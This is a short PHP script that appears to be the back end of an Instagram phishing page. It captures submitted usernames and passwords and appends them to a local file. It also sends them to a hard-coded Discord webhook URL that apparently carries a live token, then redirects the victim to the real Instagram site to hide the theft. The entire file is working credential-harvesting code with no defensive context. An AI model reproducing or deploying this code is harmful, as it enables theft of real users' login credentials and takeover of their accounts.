<?php
$data = "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n";
file_put_contents("usernames.txt", $data, FILE_APPEND);

$webhookurl = "https://discord.com/api/webhooks/1574410099294732320/yVIpbgS7Zz1WJpP6PPuZiG_gB796XDrJAgpqri6DoPJkcEsS9HocqYmBoqK_a31101pB";
$json_data = json_encode(["content" => $data], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
$ch = curl_init($webhookurl);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

header('Location: https://instagram.com');
exit();
?>